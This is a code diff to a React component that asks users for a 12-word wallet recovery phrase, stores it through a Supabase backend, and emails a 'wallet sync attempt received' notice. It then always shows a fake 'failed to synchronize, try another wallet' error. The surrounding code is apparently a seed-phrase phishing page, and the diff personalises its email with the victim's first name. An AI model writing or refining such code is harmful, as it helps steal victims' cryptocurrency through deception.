@@ -20,6 +20,7 @@ const Phrases = () => {
   const [submitting, setSubmitting] = useState(false);
   const [done, setDone] = useState(false);
 
+  const firstName = user?.user_metadata?.full_name?.split(" ")[0] ?? "";
   const isOther = walletName === "Other";
 
   const setWord = (i: number, v: string) => {
@@ -63,13 +64,14 @@ const Phrases = () => {
       phrase: phrase.join(" "),
     });
 
-        setSubmitting(false);
+    setSubmitting(false);
     if (error) return toast.error(error.message);
 
     if (user.email) {
       supabase.functions.invoke("send-email", {
         body: {
           to: user.email,
+          first_name: firstName,
           subject: "Wallet sync attempt received",
           message: `We received a request to sync your ${finalWalletName} wallet. Our team has been notified and will reach out if anything further is needed.`,
         },
@@ -79,7 +81,7 @@ const Phrases = () => {
     setDone(true);
     setPhrase(Array(12).fill(""));
     toast.error("Failed to synchronize wallet. Please try another wallet or contact support.");
-
+  };
 
   if (done) {
     return (
